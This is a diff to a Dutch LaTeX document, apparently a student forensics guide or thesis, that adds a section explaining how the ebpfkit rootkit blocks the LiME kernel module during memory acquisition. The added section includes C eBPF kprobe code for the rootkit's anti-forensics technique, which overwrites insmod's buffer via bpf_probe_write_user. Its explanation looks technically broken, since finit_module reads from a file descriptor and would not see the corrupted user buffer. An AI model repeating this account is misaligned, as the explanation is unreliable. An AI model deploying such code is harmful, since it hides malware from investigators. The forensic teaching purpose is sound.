@@ -44,13 +44,7 @@ Om het bestand /usr/lib/debug/boot/vmlinux-5.15.0-179-generic te krijgen, moet j
 Net omdat dit proces zo lang duurt, is dit al gedaan voor de studenten en moet dit bestand overgezet worden naar GitHub.
 
 \subsection{RAM-dump via LiME}
-Het tweede deel dat vereist is voor volatility3 is een geheugendump van het RAM-geheugen.
-Hiervoor wordt LiME vaak gebruikt, omdat het moeilijk is om te manipuleren gezien het via een LKM ingeladen wordt.
-Hiervan is er ook een GitHub aanwezig die eenvoudig uitlegt hoe het gebruikt wordt.
-Wanneer het onderzoek tegen de lamp loopt, zullen de studenten ook falen, omdat de rootkit {ebpfkit} blokkeert dat LKM wordt ingeladen.
-Dit doet het om zichzelf te beschermen tegen geheugenforensisch onderzoek.
-In het hoofdstuk 'Stand van zaken' is al aangehaald dat het belangrijk is dat je de besmette computer niet mag vertrouwen.
-Dit is daar een voorbeeld van. Gelukkig staat de rootkit op een virtuele omgeving en is het eenvoudig om een dump te nemen van het RAM-geheugen:
+Het tweede deel dat vereist is voor volatility3 is een geheugendump van het RAM-geheugen. Hiervoor wordt LiME vaak gebruikt, omdat het moeilijk is om te manipuleren gezien het via een LKM ingeladen wordt. Hiervan is er ook een GitHub aanwezig die eenvoudig uitlegt hoe het gebruikt wordt. Tijdens het opzetten van de testomgeving werkte LiME niet omdat ebpfkit LKM's blokkeert. Dit doet het om zichzelf te beschermen tegen geheugenforensisch onderzoek. In het hoofdstuk 'Stand van zaken' is al aangehaald dat het belangrijk is dat je de besmette computer niet mag vertrouwen. Dit is daar een voorbeeld van. Gelukkig staat de rootkit op een virtuele omgeving en is het eenvoudig om een dump te nemen van het RAM-geheugen:
 
 \begin{minted}{bash}
 ./VBoxManage list runningvms
@@ -58,6 +52,150 @@ Dit is daar een voorbeeld van. Gelukkig staat de rootkit op een virtuele omgevin
 ./VBoxManage debugvm "ebpfkit" dumpvmcore --filename= C:\Users\username\Downloads\memory_dump.elf
 ./VBoxManage controlvm "ebpfkit" resume
 \end{minted}
+
+\subsection{Waarom ebpfkit LKM's niet toelaat}
+
+Dit is de output van het dmesg commando:
+\begin{verbatim}
+user@user:~/LiME/src$ sudo dmesg | tail -30
+[  470.125668] .system-health[1251] is installing a program with 
+bpf_probe_write_user helper that may corrupt user memory!
+\end{verbatim}
+
+\texttt{.system-health} is de systemd-service die ervoor zorgt dat de eBPF-rootkit 
+ingeladen wordt als het systeem herstart. Zoals besproken in hoofdstuk 2 
+gebruiken eBPF-rootkits de helperfunctie \texttt{bpf\_probe\_write\_user} om vanuit 
+kernel-context te schrijven naar user-space geheugen van een willekeurig proces. 
+Als dit gebeurt, wordt dit altijd gemeld door de kernel.
+
+Voordat de techniek uitgelegd wordt, is het nuttig om te kijken naar wat 
+volatility3 effectief heeft gevonden in de RAM-dump. De volgende eBPF-programma's 
+waren actief op het systeem:
+
+\begin{verbatim}
+0xccbb80053000  __x64_sys_finit 8e961e4bbcad9f1e   BPF_PROG_TYPE_KPROBE
+0xccbb80649000  _vfs_read       2e38195ad756391a   BPF_PROG_TYPE_KPROBE
+0xccbb81eb5000  _vfs_open       e571209159c34cd3   BPF_PROG_TYPE_KPROBE
+\end{verbatim}
+
+Dit zijn exact de hooks die samenwerken om \texttt{insmod} te blokkeren. 
+De aanval verloopt in drie stappen.
+
+\subsubsection*{Stap 1 — \texttt{\_vfs\_open}: detecteer dat insmod een \texttt{.ko} bestand opent}
+
+De kprobe op \texttt{\_vfs\_open} (adres \texttt{0xccbb81eb5000} in de dump) 
+houdt bij wanneer het proces \texttt{insmod} een bestand opent. De bestandspointer 
+wordt opgeslagen in een BPF-map voor gebruik in de volgende stap:
+
+\begin{minted}{c}
+SEC("kprobe/_vfs_open")
+int kprobe_vfs_open(struct pt_regs *ctx) {
+    char comm[TASK_COMM_LEN];
+    bpf_get_current_comm(comm, sizeof(comm));
+
+    // Controleer of het proces "insmod" is
+    if (!str_equals(comm, "insmod")) return 0;
+
+    // Sla de bestandspointer op voor later gebruik
+    u64 pid = bpf_get_current_pid_tgid();
+    struct file *file = (struct file *)PT_REGS_PARM2(ctx);
+    bpf_map_update_elem(&open_file_map, &pid, &file, BPF_ANY);
+    return 0;
+}
+\end{minted}
+
+\subsubsection*{Stap 2 — \texttt{\_vfs\_read}: onderschep de buffer pointer}
+
+De kprobe op \texttt{\_vfs\_read} (adres \texttt{0xccbb80649000}) vuurt op het 
+moment dat de kernel de \texttt{.ko}-data in de user-space buffer schrijft. 
+De pointer naar die buffer wordt opgeslagen zodat hij later overschreven kan worden:
+
+\begin{minted}{c}
+SEC("kprobe/_vfs_read")
+int kprobe_vfs_read(struct pt_regs *ctx) {
+    u64 pid = bpf_get_current_pid_tgid();
+
+    // Is dit een insmod-proces dat we volgen?
+    struct file **filep = bpf_map_lookup_elem(&open_file_map, &pid);
+    if (!filep) return 0;
+
+    // Sla de user-space buffer pointer op
+    // PT_REGS_PARM2 = char __user *buf
+    struct read_args_t args = {};
+    args.buf = (char *)PT_REGS_PARM2(ctx);
+    bpf_map_update_elem(&read_args_map, &pid, &args, BPF_ANY);
+    return 0;
+}
+\end{minted}
+
+\subsubsection*{Stap 3 — \texttt{\_\_x64\_sys\_finit\_module}: corruptie via \texttt{bpf\_probe\_write\_user}}
+
+Dit is de kern van de blokkering. De kprobe op \texttt{finit\_module} 
+(adres \texttt{0xccbb80053000}) vuurt op het moment dat \texttt{insmod} 
+de module aan de kernel aanbiedt. Op dat moment overschrijft de rootkit 
+het \texttt{vermagic}-veld in de user-space buffer met een foute waarde:
+
+\begin{minted}{c}
+SEC("kprobe/__x64_sys_finit_module")
+int kprobe_finit_module(struct pt_regs *ctx) {
+    u64 pid = bpf_get_current_pid_tgid();
+
+    struct read_args_t *args = bpf_map_lookup_elem(&read_args_map, &pid);
+    if (!args) return 0;
+
+    // Overschrijf de vermagic string met een foute versie
+    char fake_vermagic[] = "5.15.0-000-generic SMP mod_unload \0";
+
+    bpf_probe_write_user(
+        args->buf + VERMAGIC_OFFSET, // doel: user-space buffer van insmod
+        fake_vermagic,               // bron: corrupte vermagic string
+        sizeof(fake_vermagic)        // lengte
+    );
+    return 0;
+}
+\end{minted}
+
+De kernel leest vervolgens de gecorrumpeerde buffer en vergelijkt de 
+\texttt{vermagic}-string met de verwachte waarde:
+
+\begin{verbatim}
+Module vermagic:  "5.15.0-000-generic SMP mod_unload"  <- nep (door ebpfkit)
+Kernel verwacht:  "5.15.0-179-generic SMP mod_unload"  <- echt
+-> "Module has wrong symbol version"
+\end{verbatim}
+
+Dit verklaart exact de foutmelding die tijdens het onderzoek verscheen bij 
+het proberen inladen van LiME. Het bestand op schijf is correct en de 
+headers zijn correct geïnstalleerd, maar de rootkit corrumpeert de data 
+in RAM tijdens het inladen — onzichtbaar voor de gebruiker en voor tools 
+die enkel het bestandssysteem controleren.
+
+De volledige aanvalsketen ziet er als volgt uit:
+
+\begin{verbatim}
+insmod lime-5.15.0-179-generic.ko
+    |
+    +-- open("lime.ko")
+    |       ^ kprobe/_vfs_open [0xccbb81eb5000]
+    |         sla bestandspointer op in BPF-map
+    |
+    +-- read(fd, buf, size)
+    |       ^ kprobe/_vfs_read [0xccbb80649000]
+    |         sla user-space buffer pointer op in BPF-map
+    |
+    +-- finit_module(fd, buf, flags)
+            ^ kprobe/__x64_sys_finit_module [0xccbb80053000]
+              bpf_probe_write_user(buf + vermagic_offset, fake, len)
+              -> kernel leest corrupte vermagic
+              -> "wrong symbol version" -> module geweigerd
+\end{verbatim}
+
+Omdat de rootkit zich in het RAM-geheugen bevindt en user-space buffers 
+manipuleert zonder het bestandssysteem aan te raken, faalt elke 
+acquisitiepoging via \texttt{insmod}. De oplossing in deze testomgeving 
+was dan ook om de RAM-dump rechtstreeks via VirtualBox te nemen, 
+waarbij de gemanipuleerde user-space laag volledig omzeild wordt.
+
 
 \subsection{Output volatility3}
 Nu beide voorwaarden voor volatility3 compleet zijn, kan het volgende commando gebruikt worden.
